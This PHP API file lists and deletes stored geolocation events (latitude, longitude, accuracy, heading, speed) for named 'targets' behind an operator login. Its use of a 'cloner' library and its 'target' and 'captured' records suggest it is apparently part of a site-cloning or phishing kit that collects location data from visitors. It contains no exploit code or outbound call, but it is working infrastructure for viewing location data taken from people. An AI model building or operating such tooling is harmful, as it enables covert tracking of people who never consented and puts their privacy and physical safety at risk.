<?php
/**
 * api/geo.php — operator-facing geolocation index.
 *
 * Routes:
 *   GET  api/geo.php                                → list every GEO event
 *   POST api/geo.php  action=delete  id=…           → drop one event by DB id
 *   POST api/geo.php  action=delete_all  slug=…     → drop every GEO event for slug
 */

require_once __DIR__ . '/../auth.php';
require_once __DIR__ . '/../lib/cloner.php';
require_once __DIR__ . '/../lib/store.php';

auth_boot();
header('Content-Type: application/json');

if (auth_user() === null) {
    http_response_code(401);
    echo json_encode(['ok' => false, 'error' => 'Not authenticated.']);
    exit;
}

function reply(int $code, array $payload): void {
    http_response_code($code);
    echo json_encode($payload);
    exit;
}

/* ------------------------------------------------------------------ *
 *  GET — list.
 * ------------------------------------------------------------------ */
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $rows = store_event_list(null, 'geo');
    $items = [];
    foreach ($rows as $row) {
        $p = $row['payload'];
        $items[] = [
            'id'         => $row['id'],
            'target'     => $row['target_slug'],
            'ts'         => $row['captured_at'],
            'lat'        => isset($p['lat']) ? (float) $p['lat'] : null,
            'lon'        => isset($p['lon']) ? (float) $p['lon'] : null,
            'accuracy_m' => isset($p['accuracy_m']) ? (float) $p['accuracy_m'] : null,
            'altitude'   => $p['altitude'] ?? null,
            'heading'    => $p['heading']  ?? null,
            'speed'      => $p['speed']    ?? null,
            'error'      => $p['error']    ?? null,
            'message'    => $p['message']  ?? null,
            'captured_at'=> $p['captured_at'] ?? null,
        ];
    }

    $sources = [];
    $with_coords = 0;
    foreach ($items as $it) {
        $sources[$it['target']] = true;
        if ($it['lat'] !== null && $it['lon'] !== null) $with_coords++;
    }

    reply(200, [
        'ok'          => true,
        'count'       => count($items),
        'sources'     => count($sources),
        'with_coords' => $with_coords,
        'items'       => $items,
    ]);
}

/* ------------------------------------------------------------------ *
 *  POST — delete.
 * ------------------------------------------------------------------ */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';

    if ($action === 'delete') {
        $id = (int) ($_POST['id'] ?? 0);
        if ($id <= 0) {
            reply(400, ['ok' => false, 'error' => 'Bad event id.']);
        }
        $ok = store_event_delete($id);
        reply(200, ['ok' => true, 'deleted' => $ok ? 1 : 0]);
    }

    if ($action === 'delete_all') {
        $slug = strtolower(trim((string) ($_POST['slug'] ?? '')));
        if (!cloner_valid_slug($slug)) {
            reply(400, ['ok' => false, 'error' => 'Invalid slug.']);
        }
        $deleted = store_event_delete_by_kind($slug, 'geo');
        reply(200, ['ok' => true, 'deleted' => $deleted]);
    }

    reply(400, ['ok' => false, 'error' => 'Unknown action.']);
}

reply(405, ['ok' => false, 'error' => 'Method not allowed.']);
